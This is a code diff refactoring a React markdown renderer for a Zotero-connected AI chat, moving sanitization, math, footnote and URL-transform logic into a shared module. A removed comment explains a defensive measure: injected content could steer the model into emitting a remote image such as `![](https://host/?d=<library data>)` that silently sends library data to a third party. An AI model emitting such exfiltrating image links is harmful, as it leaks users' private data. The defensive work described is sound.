@@ -1,256 +1,24 @@
 import React from 'react';
-import ReactMarkdown, { defaultUrlTransform } from 'react-markdown';
-import remarkMath from 'remark-math';
-import remarkGfm from 'remark-gfm'
-import rehypeRaw from 'rehype-raw';
-import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
+import ReactMarkdown from 'react-markdown';
 import Citation from '@beaver/agent-ui/chat/Citation';
 import rehypeKatex from 'rehype-katex';
-import deepmerge from 'deepmerge';
 import { 
     preprocessCitations, 
     createPreprocessState 
 } from '../../utils/citationPreprocessing';
-import { processPartialContent } from '../../utils/markdownPartialContent';
-import { unwrapLegacyNoteTags } from '../../utils/legacyNoteTags';
+import {
+    exportUrlTransform,
+    markdownRemarkPlugins,
+    markdownSanitizePlugins,
+    markdownUrlTransform,
+    noteRehypePlugins,
+    prepareMarkdownSource,
+} from '@beaver/agent-export/render/markdownPipeline';
 import { getHost } from '@beaver/agent-ui/host';
 import { resolveObjectIdReference } from '@beaver/agent-core/identity/libraryRef';
-import { itemLinkExportHref, parseItemLinkHref, type ItemLinkTarget } from '@beaver/agent-core/identity/itemLinks';
+import { parseItemLinkHref, type ItemLinkTarget } from '@beaver/agent-core/identity/itemLinks';
 import { useFindQuery } from '@beaver/agent-ui/chat/findContext';
 import { rehypeFindHighlight } from '@beaver/agent-ui/chat/rehypeFindHighlight';
-
-const citationDataAttributes = [
-    'data-library-id', 'dataLibraryId',
-    'data-library-ref', 'dataLibraryRef',
-    'data-zotero-key', 'dataZoteroKey',
-    'data-external-id', 'dataExternalId',
-    'data-external-source', 'dataExternalSource',
-    'data-ext-key', 'dataExtKey',
-    'data-loc', 'dataLoc',
-    'data-loc-kind', 'dataLocKind',
-    'data-loc-value', 'dataLocValue',
-    'data-requested-citation-key', 'dataRequestedCitationKey',
-    'data-resolved-citation-key', 'dataResolvedCitationKey',
-    'data-consecutive', 'dataConsecutive',
-    'data-adjacent', 'dataAdjacent',
-    'data-invalid-reason', 'dataInvalidReason',
-    'data-raw-identity', 'dataRawIdentity',
-    'data-identity-attr', 'dataIdentityAttr',
-];
-
-// `<picture>`/`<source>` would load a remote `srcSet`, which neither the
-// sanitizer's protocol check nor `urlTransform` covers. Images are replaced by
-// `rehypeImagesAsLinks`.
-const blockedTagNames = new Set(['picture', 'source']);
-
-// Create a custom schema that extends GitHub's defaults but allows normalized citation tags.
-const mergedSchema = deepmerge(defaultSchema, {
-    attributes: {
-        ...defaultSchema.attributes,
-        citation: citationDataAttributes
-    },
-    protocols: {
-        ...defaultSchema.protocols,
-        href: [...(defaultSchema.protocols?.href || []), 'zotero']
-    }
-});
-// `deepmerge` concatenates arrays, so the tag list is replaced after the merge.
-const customSchema = {
-    ...mergedSchema,
-    tagNames: [
-        ...(defaultSchema.tagNames || []).filter((tagName) => !blockedTagNames.has(tagName)),
-        'citation',
-    ],
-};
-
-/**
- * Extract text content from a HAST node tree.
- */
-function hastTextContent(node: any): string {
-    if (node.type === 'text') return node.value || '';
-    if (node.children) {
-        return node.children.map((c: any) => hastTextContent(c)).join('');
-    }
-    return '';
-}
-
-/**
- * Rehype plugin that converts math nodes to Zotero's note format
- * instead of rendering with KaTeX.
- *
- * After remark-math + rehype-sanitize, math nodes appear as:
- *   - Inline:  <code class="language-math">content</code>
- *   - Display: <pre><code class="language-math">content</code></pre>
- *
- * This plugin transforms them to:
- *   - Inline:  <span class="math">$content$</span>
- *   - Display: <pre class="math">$$content$$</pre>
- */
-function rehypeZoteroMath() {
-    return (tree: any) => {
-        transformMathNodes(tree);
-    };
-}
-
-function transformMathNodes(node: any) {
-    if (!node.children) return;
-
-    for (let i = 0; i < node.children.length; i++) {
-        const child = node.children[i];
-        if (child.type !== 'element') continue;
-
-        const classes: string[] = Array.isArray(child.properties?.className)
-            ? child.properties.className
-            : [];
-
-        // Display math: <pre><code class="language-math">content</code></pre>
-        if (child.tagName === 'pre' && child.children?.length === 1) {
-            const codeChild = child.children[0];
-            if (codeChild.type === 'element' && codeChild.tagName === 'code') {
-                const codeClasses: string[] = Array.isArray(codeChild.properties?.className)
-                    ? codeChild.properties.className
-                    : [];
-                if (codeClasses.includes('language-math')) {
-                    const mathContent = hastTextContent(codeChild);
-                    child.properties = { className: ['math'] };
-                    child.children = [{ type: 'text', value: `$$${mathContent}$$` }];
-                    continue;
-                }
-            }
-        }
-
-        // Inline math: <code class="language-math">content</code>
-        if (child.tagName === 'code' && classes.includes('language-math')) {
-            const mathContent = hastTextContent(child);
-            child.tagName = 'span';
-            child.properties = { className: ['math'] };
-            child.children = [{ type: 'text', value: `$${mathContent}$` }];
-            continue;
-        }
-
-        // Recurse into untransformed nodes
-        transformMathNodes(child);
-    }
-}
-
-function hasProperty(node: any, name: string): boolean {
-    return node?.type === 'element' && node.properties?.[name] !== undefined;
-}
-
-/**
- * Rehype plugin that replaces every image with a link to it.
- *
- * Markdown comes from model output, which can be steered by untrusted content
- * the agent reads (PDFs, web pages, shared notes). A remote image loads as soon
- * as it renders, so an injected `![](https://host/?d=<library data>)` would
- * send data to a third party without any user action. As a link, the URL is
- * only fetched when the user clicks it. An image that is already inside a link
- * becomes its label text, so the outer link stays the only destination.
- * Exports apply the same rule, since notes load images too.
- */
-function rehypeImagesAsLinks() {
-    return (tree: any) => {
-        replaceImages(tree, false);
-    };
-}
-
-function replaceImages(node: any, insideLink: boolean): void {
-    if (!node.children) return;
-    const childrenInsideLink = insideLink || (node.type === 'element' && node.tagName === 'a');
-    node.children = node.children.flatMap((child: any) => {
-        if (child.type !== 'element' || child.tagName !== 'img') {
-            replaceImages(child, childrenInsideLink);
-            return [child];
-        }
-        const { src, alt, title } = child.properties ?? {};
-        const href = typeof src === 'string' ? src : '';
-        const label = (typeof alt === 'string' && alt) || href;
-        if (!label) return [];
-        const text = { type: 'text', value: label };
-        if (childrenInsideLink || !href) return [text];
-        const properties: Record<string, unknown> = { href };
-        if (typeof title === 'string' && title) properties.title = title;
-        return [{ type: 'element', tagName: 'a', properties, children: [text] }];
-    });
-}
-
-/**
- * Rehype plugin that rewrites GFM footnotes as endnotes a Zotero note can
- * hold. The note editor has no footnotes and drops in-note anchors, so the
- * chat's footnote markup would leave a "Footnotes" heading, dead links and
- * "↩" back-references in the note. Instead:
- *   - a reference `<sup><a href="#fn-1">1</a></sup>` becomes `<sup>1</sup>`;
- *   - the definitions section becomes a "Notes" heading followed by its
- *     numbered list, without the back-references.
- */
-function rehypeZoteroNoteFootnotes() {
-    return (tree: any) => {
-        transformFootnotes(tree);
-    };
-}
-
-function transformFootnotes(node: any) {
-    if (!node.children) return;
-    const children: any[] = [];
-    let removedBackref = false;
-    // A removed back-reference leaves the space that preceded it.
-    const trimTrailingSpace = () => {
-        while (children.length > 0) {
-            const last = children[children.length - 1];
-            if (last.type !== 'text') return;
-            last.value = last.value.replace(/\s+$/, '');
-            if (last.value) return;
-            children.pop();
-        }
-    };
-    for (const child of node.children) {
-        if (hasProperty(child, 'dataFootnoteRef')) {
-            // The reference's number, without the in-note link.
-            children.push(...(child.children ?? []));
-            continue;
-        }
-        if (hasProperty(child, 'dataFootnoteBackref')) {
-            trimTrailingSpace();
-            removedBackref = true;
-            continue;
-        }
-        // Whitespace between removed back-references.
-        if (removedBackref && child.type === 'text' && !child.value.trim()) continue;
-        if (child.type === 'element' && child.tagName === 'section' && hasProperty(child, 'dataFootnotes')) {
-            const list = (child.children ?? []).find((grandchild: any) => grandchild.type === 'element' && grandchild.tagName === 'ol');
-            if (!list) continue;
-            transformFootnotes(list);
-            for (const item of list.children ?? []) {
-                if (item.type === 'element') item.properties = {};
-            }
-            children.push(
-                { type: 'element', tagName: 'h2', properties: {}, children: [{ type: 'text', value: 'Notes' }] },
-                { type: 'text', value: '\n' },
-                list,
-            );
-            continue;
-        }
-        transformFootnotes(child);
-        children.push(child);
-    }
-    if (removedBackref) trimTrailingSpace();
-    node.children = children;
-}
-
-/** Allow zotero:// URLs through react-markdown's URL sanitization */
-function urlTransform(url: string): string {
-    if (url.startsWith('zotero://')) return url;
-    return defaultUrlTransform(url);
-}
-
-/**
- * Export variant: the rendered HTML is saved into a Zotero note, where a bare
- * object id (`u-KEY`) is not a working href, so item links are written as
- * `zotero://select` URIs the note editor can follow.
- */
-function exportUrlTransform(url: string): string {
-    return itemLinkExportHref(url) ?? urlTransform(url);
-}
 
 /**
  * Follow a link to a Zotero object. The object id is resolved here, at click
@@ -322,13 +90,12 @@ const MarkdownRenderer: React.FC<MarkdownRendererProps> = React.memo(function Ma
     // `processedMarkdown` memo below, which is why that one stays independent of
     // the query.
     const rehypePlugins = React.useMemo(() => {
+        // The note rules (Zotero math and endnotes) are the ones the note
+        // renderer in the plugin realm uses, so an export matches a note write.
         const plugins: RehypePlugins = [
-            rehypeRaw,
-            [rehypeSanitize, customSchema],
-            rehypeImagesAsLinks,
-            exportRendering ? rehypeZoteroMath : rehypeKatex,
+            ...markdownSanitizePlugins,
+            ...(exportRendering ? noteRehypePlugins : [rehypeKatex]),
         ];
-        if (exportRendering) plugins.push(rehypeZoteroNoteFootnotes);
         // Always last. The transformer inserts markup the sanitize schema does
         // not allow, so sanitizing after it would strip the highlights, and it
         // can only recognize (and skip) KaTeX output once KaTeX has produced it.
@@ -337,26 +104,17 @@ const MarkdownRenderer: React.FC<MarkdownRendererProps> = React.memo(function Ma
     }, [findQuery, exportRendering]);
 
     // Heavy preprocessing: skip when content/flags are unchanged (e.g. parent re-render).
-    const processedMarkdown = React.useMemo(() => {
-        let markdownContent = processPartialContent(content, exportRendering);
-        // Threads predating the `create_note` tool still carry `<note>` sections.
-        markdownContent = unwrapLegacyNoteTags(markdownContent);
-        markdownContent = preprocessCitations(markdownContent, createPreprocessState());
-        return markdownContent
-            .replace(/```plaintext\s*([\s\S]*?)\s*```/, '$1')
-            .replace(/(?<!\\)\\\(((?:\\.|[^\\])*?)\\\)/g, (_, match) => `$${match}$`)
-            .replace(/(?<!\\)\\\[((?:\\.|[^\\])*?)\\\]/g, (_, match) => `$$${match}$$`)
-            .replace(/\$\$([^$]+)\$\$/g, (_, equation) => `\n$$\n${equation.trim()}\n$$\n`);
-    }, [content, exportRendering]);
+    const processedMarkdown = React.useMemo(() => prepareMarkdownSource(content, {
+        exportRendering,
+        preprocessCitations: (text) => preprocessCitations(text, createPreprocessState()),
+    }), [content, exportRendering]);
 
     return (
         <div className={className}>
             <ReactMarkdown
-                // Strikethrough needs `~~`: models write subscripts as `P~lac~`
-                // and approximations as `~5`, which single tildes would strike.
-                remarkPlugins={[remarkMath, [remarkGfm, { singleTilde: false }]]}
+                remarkPlugins={markdownRemarkPlugins}
                 rehypePlugins={rehypePlugins}
-                urlTransform={exportRendering ? exportUrlTransform : urlTransform}
+                urlTransform={exportRendering ? exportUrlTransform : markdownUrlTransform}
                 components={{
                     // @ts-expect-error - Custom component not in ReactMarkdown types
                     citation: ({node, ...props}: any) => {
